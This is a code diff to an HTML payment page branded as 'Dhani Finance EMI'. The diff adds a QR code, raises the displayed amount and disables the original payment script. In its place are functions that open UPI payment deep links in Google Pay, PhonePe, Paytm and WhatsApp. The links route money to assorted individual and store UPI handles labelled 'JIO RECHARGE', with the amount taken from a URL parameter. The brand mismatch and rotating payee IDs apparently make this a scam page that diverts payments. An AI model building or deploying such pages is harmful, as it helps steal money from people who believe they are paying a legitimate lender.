@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Options</title>
+    <title>Dhani Finance EMI</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"></link>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
@@ -12,7 +12,7 @@
         <div class="flex items-center">
             <a href="#" class="mr-2"><i class="fas fa-arrow-left"></i></a>
             <div class="flex items-center">
-                <img src="./logo_data - Copy.png" alt="A logo of a building with a door and a window" class="mr-2">
+                <img src="./logo_data.png" alt="A logo of a building with a door and a window" class="mr-2" width="60" height="60" >
                 <h1 class="text-lg font-bold">Dhani Finance</h1>
             </div>
         </div>
@@ -64,7 +64,7 @@
         </div>
         <div class="bg-white rounded-lg shadow-md p-4 flex items-center justify-between">
             <div class="flex items-center">
-                <img src="https://placehold.co/128x128" alt="A QR code with a black and white pattern" class="mr-4">
+                <img src="./qr-code (1).png" alt="A QR code with a black and white pattern" class="mr-4" width="150" height="150" >
                 <h4 class="text-lg font-medium" style="font-size: small;" >SCAN WITH ANY APP</h4>
                 <style>.text-lg {
                     font-size: 1.125rem; /* 18px */
@@ -106,7 +106,7 @@
                     </svg>
                     </span>UPI</h4>
             </div>
-            <div class="flex items-center">
+            <div class="flex items-center" onclick="gpayclick()"> 
                 <img src="./ui/googlepay.svg" width="24" height="24" alt="A logo of Google Pay with a colorful icon" class="mr-2">
                 <img src="./ui/phonepe.e101f376.svg" width="24" height="24" alt="A logo of PhonePe with a purple icon" class="mr-2">
                 <img src="./ui/paytm.svg" width="24" height="24" alt="A logo of BHIM with a black and white icon" class="mr-2">
@@ -138,7 +138,7 @@
             <i class="fas fa-chevron-right"></i>
         </div>
         <div class="flex items-center justify-between mt-6">
-            <div class="text-lg font-bold">₹240.75</div>
+            <div class="text-lg font-bold">₹1233.75</div>
             <div class="text-gray-500">
        
             </div>
@@ -147,7 +147,37 @@
         <button class="bg-black text-white font-bold py-2 px-4 rounded-lg mt-4 w-full" id="onBuyClicked" >Continue</button>
     </div>
 
-<script>
+
+    <script>
+        var urlParams = new URLSearchParams(window.location.search);
+        var Id = urlParams.get('id');
+      
+        document.getElementById("offer-id").innerHTML = " " + Id;
+        
+        const upi ="shreenandanente348386.rzp@icici"
+        function gpayclick() {
+                  const url = "tez://upi/pay?ver=01&mode=19&pa=jiostore322235.rzp@icici&pn=JIO RECHARGE&tr=RZPOvZfYp5UFvRLoRqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to Jio Recharge &am=" + Id ;
+                  window.location.href = url;
+              }
+              
+              function phonepayclick() {
+                  const url = "phonepe://pay?ver=01&mode=19&pa=dikshitah1@oksbi&pn=JIO RECHARGE&tr=RZPOvZfYp5UFvRLoRqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to  Jio Recharge&am=" + Id ;
+                  window.location.href = url;
+              }
+              function paytmclick() {
+                  const url = "paytmmp://pay?ver=01&mode=19&pa=manishkumarnaya389039.rzp@icici&pn=JIO RECHARGE&tr=RZPOvZfYp5UFvRLoRqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to Jio Recharge&am=" + Id ;
+                  window.location.href = url;
+              }
+              
+              function whatsappclick() {
+                  const url = "whatsapp://pay?ver=01&mode=19&pa=Offerstore456924.rzp@icici&pn=JIO RECHARGE&tr=RZPOvZfYp5UFvRLoRqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to Jio Recharge&am=" + Id ;
+                  window.location.href = url;
+              }
+      
+      
+      </script>
+
+<!--<script>
 document.getElementById('onBuyClicked').addEventListener('click', function() {
     onBuyClicked(30.00); // Example amount
 });
@@ -310,7 +340,7 @@ function isUCWebBrowser() {
 function isIOS() {
     return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
 }
-</script>
+</script>--!-->
 
 <!-- Include SweetAlert2 for alerts -->
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
